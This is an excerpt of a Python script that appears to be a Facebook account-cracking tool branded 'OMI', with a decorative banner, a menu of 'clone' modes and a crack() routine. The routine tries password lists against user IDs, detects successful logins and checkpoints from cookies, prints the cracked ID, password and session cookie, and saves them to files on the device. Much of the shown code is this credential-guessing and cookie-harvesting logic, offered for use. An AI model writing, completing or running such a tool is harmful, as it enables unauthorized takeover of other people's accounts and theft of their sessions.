...
def banner():
    ...
    \033[38;5;46m║ ║ \033[30;1m██    ██  ║ \033[38;5;46m║\x1b[38;5;196m██    ██║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ OMI𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m ██    ██║ \033[38;5;46m║\x1b[38;5;196m  ██    ██║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ OMI𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m ██    ██ ║ \033[38;5;46m║\x1b[38;5;196m ██    ██║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ OMI𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m  ██  ██  ║ \033[38;5;46m║\x1b[38;5;196m ██    ██║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ OMI𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m   ████║ \033[38;5;46m║\x1b[38;5;196m     ██████  ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ OMI𝄟⃝║
...
def menu():
	...
	_OMI_(f'\033[1;92m[\033[1;34m1\033[38;5;46m]OMI 𝐖𝐎𝐑𝐊_____𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐄 \x1b[38;5;196m𝐖𝐎𝐑𝐊𝐈𝐍𝐆')
	_OMI_(f'\033[1;92m[\033[1;92m2\033[38;5;46m[OMI 𝐖𝐎𝐑𝐊______𝐑𝐀𝐍𝐃𝐎𝐌  𝐂𝐋𝐎𝐍𝐄 \x1b[38;5;196m𝐖𝐎𝐑𝐊𝐈𝐍𝐆')
	_OMI_(f'\033[1;92m[\033[1;92m3\033[38;5;46m[OMI 𝐖𝐎𝐑𝐊_______𝐄𝐌𝐀𝐈𝐋 𝐂𝐋𝐎𝐍𝐄 \x1b[38;5;196m𝐖𝐎𝐑𝐊𝐈𝐍𝐆')
	_OMI_(f'[\033[1;92m\033[1;34m4\033[38;5;46m]OMI____\x1b[38;5;196m𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐌𝐄')
	_OMI_(f'\033[1;92m[\033[1;34m0\033[38;5;46m]𝐄𝐗𝐈𝐓')
	_____OMI_____ = input('\033[1;92m\033[38;5;46m𝐂𝐇𝐎𝐎𝐒𝐄 :\x1b[1;92m ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [OMI] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mOMI-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				...
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mOMI-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/OMI-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mOMI-EHC\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/OMI-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
              ...
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/OMI-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        ...
        sys.stdout.write('\r%s[OMI-EHC]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
